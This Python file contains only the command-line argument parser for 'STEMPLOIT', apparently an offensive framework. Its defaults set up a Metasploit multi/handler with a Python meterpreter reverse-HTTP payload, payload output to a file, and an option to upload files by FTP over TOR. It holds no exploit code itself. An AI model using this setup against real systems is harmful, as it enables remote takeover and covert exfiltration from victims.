import argparse


def parse_arguments():
    parser = argparse.ArgumentParser(description='Parsing Arguments for STEMPLOIT Framework')
    parser.add_argument(
        '--exploit', '-ex', type=str, required=False,
        metavar='exploit', default='exploit/multi/handler',
        help='expects an exploit setup usage <name|term|index>'
    )
    parser.add_argument(
        '--payload', '-p', type=str, required=False,
        metavar='payload', default='python/meterpreter_reverse_http',
        help='expects a meterpreter payload module to target exploitation'
    )
    parser.add_argument(
        '--local-port', '-lp', type=int, required=False,
        metavar='local_port', default=5000,
        help='expects a local port number for local connection binding'
    )
    parser.add_argument(
        '--remote-port', '-rp', type=int, required=False,
        metavar='remote_port', default=80,
        help='expects a remote port number for a reverse server connection'
    )
    parser.add_argument(
        '--local-host', '-lh', type=str, required=False,
        metavar='local_host', default='127.0.0.1',
        help='expects a local address of the controlling server'
    )
    parser.add_argument(
        '--payload-outfile', '-of', type=str, required=False,
        metavar='payload_outfile', default='payload.py',
        help='expects a FILENAME for a STDOUT to save the generated payload'
    )
    parser.add_argument(
        '--onion-ftp', '-oftp', type=bool, required=False,
        metavar='onion_ftp', default=False,
        help='expects a state change from False to True , then will upload a file using ftp via TOR'
    )
    parser.add_argument('--example', type=str, required=False,
                        metavar='example', default=None, help="\n=======\nE.g.\n\t\vpython stemploit.py --exploit exploit/multi/handler --remote-port 80 --local-port 5000 --local-host 127.0.0.1 --payload python/meterpreter_reverse_http")
    return parser.parse_args()
